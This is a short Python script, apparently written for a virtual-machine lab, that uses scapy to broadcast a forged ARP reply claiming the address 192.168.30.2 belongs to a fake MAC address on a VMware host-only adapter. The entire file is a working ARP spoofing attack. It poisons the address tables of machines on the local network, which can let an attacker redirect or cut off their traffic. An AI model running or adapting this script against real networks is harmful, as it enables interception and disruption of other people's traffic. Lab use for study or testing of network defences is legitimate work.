from scapy.all import Ether, ARP, sendp, conf

iface = "VMware Network Adapter VMnet1"
conf.iface = iface

fake_mac = "de:ad:be:ef:00:01"
spoofed_ip = "192.168.30.2"

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=spoofed_ip, hwsrc=fake_mac, pdst=spoofed_ip)
sendp(pkt, iface=iface, verbose=False)

print(f"sent spoofed ARP: {spoofed_ip} is at {fake_mac}")